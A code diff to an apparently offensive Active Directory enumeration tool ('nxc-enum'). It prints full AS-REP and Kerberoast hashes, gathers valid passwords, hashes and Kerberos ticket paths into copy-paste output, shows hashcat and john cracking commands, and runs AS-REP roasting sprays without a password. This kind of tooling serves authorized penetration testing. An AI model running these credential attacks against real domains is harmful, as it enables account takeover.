@@ -327,6 +327,7 @@ def _run_single_target(
             # Multi-credential validation (parallel)
             valid_creds = validate_credentials_multi(target, working_creds, args.timeout, args)
             if not valid_creds:
+                status("Hint: Use --no-validate to skip credential validation", "info")
                 elapsed = time.time() - target_start
                 return TargetResult(
                     target=target,
@@ -344,6 +345,8 @@ def _run_single_target(
                 cache.auth_args = primary_cred.auth_args()
                 cache.primary_credential = primary_cred
             except CredentialError as e:
+                status(f"Credential error: {e}", "error")
+                status("Hint: Use --no-validate to skip credential validation", "info")
                 elapsed = time.time() - target_start
                 return TargetResult(
                     target=target,
@@ -361,6 +364,8 @@ def _run_single_target(
                 cache.auth_args = working_creds[0].auth_args()
                 cache.primary_credential = working_creds[0]
             except CredentialError as e:
+                status(f"Credential error: {e}", "error")
+                status("Hint: Use --no-validate to skip credential validation", "info")
                 elapsed = time.time() - target_start
                 return TargetResult(
                     target=target,
@@ -371,6 +376,7 @@ def _run_single_target(
 
             valid, is_admin = validate_credentials(target, cache.auth_args, cache)
             if not valid:
+                status("Hint: Use --no-validate to skip credential validation", "info")
                 elapsed = time.time() - target_start
                 return TargetResult(
                     target=target,
@@ -386,6 +392,7 @@ def _run_single_target(
             cache.auth_args = working_creds[0].auth_args()
             cache.primary_credential = working_creds[0]
         except CredentialError as e:
+            status(f"Credential error: {e}", "error")
             elapsed = time.time() - target_start
             return TargetResult(
                 target=target,
@@ -401,6 +408,7 @@ def _run_single_target(
             cache.auth_args = working_creds[0].auth_args()
             cache.primary_credential = working_creds[0]
         except CredentialError as e:
+            status(f"Credential error: {e}", "error")
             elapsed = time.time() - target_start
             return TargetResult(
                 target=target,
@@ -488,6 +496,24 @@ def _run_single_target(
             cache=cache,
             elapsed_time=elapsed,
         )
+
+    # Store valid credentials in copy-paste data (format: domain\user:secret or user:secret)
+    for cred in working_creds:
+        # Build credential string in copy-pastable format
+        user_part = cred.display_name()  # e.g., "domain\user" or "user"
+        if cred.password:
+            cred_str = f"{user_part}:{cred.password}"
+        elif cred.hash:
+            cred_str = f"{user_part}:{cred.hash}"
+        elif cred.ccache_file:
+            cred_str = f"{user_part}:KRB5CCACHE:{cred.ccache_file}"
+        elif cred.pfx_file:
+            cred_str = f"{user_part}:PFX:{cred.pfx_file}"
+        elif cred.pem_file:
+            cred_str = f"{user_part}:PEM:{cred.pem_file}"
+        else:
+            cred_str = f"{user_part}:(no secret)"
+        cache.copy_paste_data["valid_credentials"].add(cred_str)
 
     # Determine which modules to run
     run_all = args.all or not any(
@@ -784,6 +810,11 @@ def run_asreproast_spray(args, targets: list[str]) -> int:
         f"AS-REP Roasting mode: Testing {len(users)} user(s) against {len(targets)} target(s)",
         "info",
     )
+    status(
+        "AS-REP Roasting requires only valid usernames (no password needed). "
+        "Accounts with DONT_REQUIRE_PREAUTH return crackable hashes.",
+        "info",
+    )
     output("")
 
     all_hashes = []
@@ -832,14 +863,22 @@ def run_asreproast_spray(args, targets: list[str]) -> int:
                 status(f"Found {len(hashes)} AS-REP hash(es)!", "warning")
                 output("")
                 for h in hashes:
-                    # Extract username from hash ($krb5asrep$23$user@DOMAIN:...)
+                    # Extract username from hash ($krb5asrep$23$user@domain@REALM:...)
+                    # Format: user@domain.local@DOMAIN.LOCAL or user@DOMAIN.LOCAL
                     try:
-                        user_part = h.split("$")[3]
-                        username = user_part.split("@")[0]
+                        user_part = h.split("$")[3]  # e.g., "j.rock@services.local@SERVICES.LOCAL"
+                        # Split by @ and take first two parts (user@domain)
+                        at_parts = user_part.split("@")
+                        if len(at_parts) >= 2:
+                            # user@domain format
+                            username = f"{at_parts[0]}@{at_parts[1].upper()}"
+                        else:
+                            username = at_parts[0]
                         vulnerable_users.add(username)
-                        output(c(f"  [!] {username}", Colors.RED))
                     except (IndexError, ValueError):
-                        output(f"  {h[:80]}...")
+                        pass
+                    # Print the full hash for copying
+                    output(h)
                 all_hashes.extend(hashes)
             else:
                 # Check stdout for indicators
@@ -865,13 +904,41 @@ def run_asreproast_spray(args, targets: list[str]) -> int:
         print_section("AS-REP Roasting Summary", "Results")
         status(f"Total vulnerable accounts: {len(vulnerable_users)}", "warning")
         output("")
-        output(c("VULNERABLE USERS:", Colors.RED))
-        for user in sorted(vulnerable_users):
-            output(f"  {c(user, Colors.RED)}")
+
+        # Make vulnerable users REALLY stand out with a prominent box
+        banner_width = 60
+        output(c("=" * banner_width, Colors.RED + Colors.BOLD))
+        output(c("  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗", Colors.RED + Colors.BOLD))
+        output(c("  ██║   ██║██║   ██║██║     ████╗  ██║", Colors.RED + Colors.BOLD))
+        output(c("  ██║   ██║██║   ██║██║     ██╔██╗ ██║", Colors.RED + Colors.BOLD))
+        output(c("  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║", Colors.RED + Colors.BOLD))
+        output(c("   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║", Colors.RED + Colors.BOLD))
+        output(c("    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝", Colors.RED + Colors.BOLD))
+        output(c("  DONT_REQUIRE_PREAUTH - NO PASSWORD NEEDED!", Colors.RED + Colors.BOLD))
+        output(c("=" * banner_width, Colors.RED + Colors.BOLD))
         output("")
-        output(c("NEXT STEPS:", Colors.YELLOW))
-        output("  1. Save hashes to a file")
-        output("  2. Crack with hashcat: hashcat -m 18200 hashes.txt wordlist.txt")
+        for user in sorted(vulnerable_users):
+            output(c(f"  >>> {user} <<<", Colors.RED + Colors.BOLD))
+        output("")
+        output(c("=" * banner_width, Colors.RED + Colors.BOLD))
+        output("")
+
+        # Show hashes for easy copying
+        output(c("HASHES:", Colors.YELLOW))
+        for h in all_hashes:
+            output(h)
+        output("")
+
+        output(c("CRACK WITH:", Colors.YELLOW))
+        output("  hashcat -m 18200 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule")
+        output("  john --format=krb5asrep hashes.txt --wordlist=wordlist.txt")
+        output("")
+
+        # Add to copy-paste data - format: username:PASSWORD (placeholder for cracked password)
+        output(c("COPY-PASTE FORMAT (after cracking):", Colors.CYAN))
+        for user in sorted(vulnerable_users):
+            cred_format = f"{user}:PASSWORD"
+            output(f"  {cred_format}")
         output("")
 
         # Write hashes to output file if specified
@@ -926,7 +993,8 @@ def run_kerberoast_spray(args, targets: list[str]) -> int:
     if not args.no_preauth_targets:
         print("Error: --kerberoast with empty password requires --no-preauth-targets FILE")
         print(
-            "Usage: nxc-enum target -u asrep_user -p '' --kerberoast --no-preauth-targets accounts.txt"
+            "Usage: nxc-enum target -u asrep_user -p '' "
+            "--kerberoast --no-preauth-targets accounts.txt"
         )
         return 1
 
@@ -948,6 +1016,11 @@ def run_kerberoast_spray(args, targets: list[str]) -> int:
     status(
         f"Kerberoasting mode: Using AS-REP roastable user '{asrep_user}' to target "
         f"{len(target_accounts)} account(s)",
+        "info",
+    )
+    status(
+        "Kerberoasting targets service accounts with SPNs. "
+        "TGS tickets contain crackable hashes for offline password recovery.",
         "info",
     )
     output("")
@@ -993,16 +1066,18 @@ def run_kerberoast_spray(args, targets: list[str]) -> int:
                 status(f"Found {len(hashes)} TGS hash(es)!", "warning")
                 output("")
                 for h in hashes:
-                    # Extract username from hash ($krb5tgs$23$*user$DOMAIN$...)
+                    # Extract username from hash ($krb5tgs$23$*user$DOMAIN$spn*$...)
                     try:
                         parts = h.split("$")
-                        if len(parts) >= 4:
-                            user_part = parts[3]
-                            username = user_part.replace("*", "").split("@")[0]
+                        if len(parts) >= 5:
+                            user_part = parts[3].replace("*", "")  # username
+                            domain_part = parts[4]  # DOMAIN
+                            username = f"{domain_part}\\{user_part}"
                             roasted_users.add(username)
-                            output(c(f"  [!] {username}", Colors.RED))
                     except (IndexError, ValueError):
-                        output(f"  {h[:80]}...")
+                        pass
+                    # Print the full hash for copying
+                    output(h)
                 all_hashes.extend(hashes)
             else:
                 # Check stdout for indicators
@@ -1028,13 +1103,21 @@ def run_kerberoast_spray(args, targets: list[str]) -> int:
         print_section("Kerberoasting Summary", "Results")
         status(f"Total roasted accounts: {len(roasted_users)}", "warning")
         output("")
-        output(c("ROASTED ACCOUNTS:", Colors.RED))
+
+        output(c("KERBEROASTABLE SERVICE ACCOUNTS:", Colors.RED))
         for user in sorted(roasted_users):
             output(f"  {c(user, Colors.RED)}")
         output("")
-        output(c("NEXT STEPS:", Colors.YELLOW))
-        output("  1. Save hashes to a file")
-        output("  2. Crack with hashcat: hashcat -m 13100 hashes.txt wordlist.txt")
+
+        # Show hashes for easy copying
+        output(c("HASHES:", Colors.YELLOW))
+        for h in all_hashes:
+            output(h)
+        output("")
+
+        output(c("CRACK WITH:", Colors.YELLOW))
+        output("  hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule")
+        output("  john --format=krb5tgs hashes.txt --wordlist=wordlist.txt")
         output("")
 
         # Write hashes to output file if specified
@@ -1119,18 +1202,19 @@ def main():
     # ─────────────────────────────────────────────────────────────────────────
     # UNAUTHENTICATED AS-REP ROASTING MODE
     # ─────────────────────────────────────────────────────────────────────────
-    # Detect: --asreproast with -U/-u and empty/no password (no -H hash, no -C credfile)
-    # This mode directly requests AS-REP tickets without credential validation
-    is_unauth_asreproast = (
-        args.asreproast
-        and (args.userfile or args.user)
+    # Detect: userfile + empty/no password (no -H hash, no -C credfile)
+    # This can run AS-REP roasting without credential validation
+    can_asreproast_spray = (
+        (args.userfile or args.user)
         and not args.hash
         and not args.credfile
         and not args.passfile
         and (args.password is None or args.password == "")
     )
 
-    if is_unauth_asreproast:
+    # If --asreproast explicitly requested, or -A with userlist + no password
+    # Run AS-REP roasting spray (this is the only unauthenticated attack we can do)
+    if can_asreproast_spray and (args.asreproast or args.all):
         sys.exit(run_asreproast_spray(args, targets))
 
     # ─────────────────────────────────────────────────────────────────────────
